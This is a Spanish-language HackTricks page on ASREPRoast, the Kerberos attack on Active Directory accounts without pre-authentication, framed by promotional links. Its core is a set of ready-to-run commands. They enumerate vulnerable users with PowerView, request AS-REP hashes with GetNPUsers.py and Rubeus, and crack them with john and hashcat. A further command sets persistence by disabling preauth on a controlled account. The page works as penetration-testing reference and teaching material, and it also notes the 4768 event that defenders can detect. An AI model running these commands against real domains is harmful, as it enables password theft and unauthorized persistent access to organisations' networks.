# ASREPRoast

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Únete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de recompensas por errores.

**Perspectivas de Hacking**\
Interactúa con contenido que profundiza en la emoción y los desafíos del hacking.

**Noticias de Hacking en Tiempo Real**\
Mantente al día con el mundo del hacking a través de noticias e insights en tiempo real.

**Últimos Anuncios**\
Mantente informado con los lanzamientos de nuevas recompensas por errores y actualizaciones importantes de la plataforma.

**Únete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) y comienza a colaborar con los mejores hackers hoy mismo!

## ASREPRoast

El ataque ASREPRoast busca **usuarios sin el atributo requerido de pre-autenticación de Kerberos (**[_**DONT\_REQ\_PREAUTH**_](https://support.microsoft.com/en-us/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro)_**)**_.

Esto significa que cualquiera puede enviar una solicitud AS\_REQ al DC en nombre de cualquiera de esos usuarios y recibir un mensaje AS\_REP. Este último tipo de mensaje contiene un fragmento de datos cifrados con la clave del usuario original, derivada de su contraseña. Luego, utilizando este mensaje, la contraseña del usuario podría ser crackeada offline.

Además, **no se necesita una cuenta de dominio para realizar este ataque**, solo conexión al DC. Sin embargo, **con una cuenta de dominio**, se puede utilizar una consulta LDAP para **recuperar usuarios sin pre-autenticación de Kerberos** en el dominio. **De lo contrario, los nombres de usuario deben ser adivinados**.

#### Enumerando usuarios vulnerables (se necesitan credenciales de dominio)
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
#### Solicitar mensaje AS\_REP

{% code title="Usando Linux" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
```markdown
{% endcode %}

{% code title="Usando Windows" %}
```
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
AS-REP Roasting con Rubeus generará un 4768 con un tipo de cifrado de 0x17 y un tipo de preautenticación de 0.
{% endhint %}

### Descifrado
```
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistencia

Fuerza que **preauth** no sea requerido para un usuario donde tienes permisos **GenericAll** (o permisos para escribir propiedades):
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
## Referencias

[**Más información sobre AS-REP Roasting en ired.team**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

¡Únete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de recompensas por errores!

**Perspectivas de Hacking**\
Interactúa con contenido que profundiza en la emoción y los desafíos del hacking.

**Noticias de Hacking en Tiempo Real**\
Mantente al día con el mundo del hacking de ritmo rápido a través de noticias e insights en tiempo real.

**Últimos Anuncios**\
Mantente informado con los lanzamientos de nuevas recompensas por errores y actualizaciones críticas de la plataforma.

**Únete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) y comienza a colaborar con los mejores hackers hoy mismo.

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos.
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
